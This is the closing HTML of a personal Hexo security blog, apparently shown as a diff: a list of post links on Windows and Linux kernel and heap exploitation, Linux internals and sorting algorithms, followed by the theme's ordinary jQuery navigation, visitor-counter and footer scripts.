exploit系列教程第十部分：内核利用程序之栈溢出</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/05/堆喷射[第二章：UAF]/">Windows exploit系列教程第九部分：堆喷射[第二章：UAF]</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/30/Kernel Driver mmap Handler Exploitation/">内核驱动mmap Handler利用技术</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/28/API Interception via DLL Redirection/">通过DLL重定向实现API劫持</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/Linux中断内幕/">Linux中断内幕</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/19/Windows架构设计/">Windows架构设计</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/30/house_of_force.log/">house_of_force log</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/25/Linux内存管理-非连续内存区管理/">Linux内核学习——内存管理之非连续内存区管理</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/24/Linux内存管理-内存区管理/">Linux内核学习——内存管理之内存区管理</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/20/Linux内存管理-页框管理/">Linux内核学习——内存管理之页框管理</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/19/first_fit.log/">first_fit log</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/19/house_of_einherjar.log/">house_of_einherjar log</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/18/fastbin_dup_into_stack.log/">fastbin_dup_into_stack log</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/12/fastbin_dup.log/">fastbin_dup log</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/23/Windows栈溢出之ret eip/">Windows栈溢出之ret eip</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/23/Windows栈溢出概述/">Windows栈溢出概述</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/16/DEFCON-2015-r0pbaby/">DEFCON-2015-r0pbaby</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/11/PWN选手的自我修养/">PWN选手的自我修养</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/27/linearsort/">linear sort</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/27/quicksort/">quicksort</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/27/heapsort&priority-queue/">heapsort & priority-queue</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/27/Linux进程的创建与撤销/">Linux内核学习——Linux进程的创建与撤销</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/26/Linux进程切换/">Linux内核学习——Linux进程切换</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/24/GNU Hash ELF Sections/">GNU Hash ELF Sections</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/22/Linux进程概述/">Linux内核学习——Linux进程概述</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/18/Linux内存寻址/">Linux内核学习——内存寻址</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/15/PlaySms  1.4代码执行漏洞之import csv/">PlaySms 1.4代码执行漏洞之import csv</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/15/PlaySms  1.4代码执行漏洞分析/">PlaySms 1.4代码执行漏洞分析</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2020 r00tk1t
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >访问数量: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+</body>
+</html>
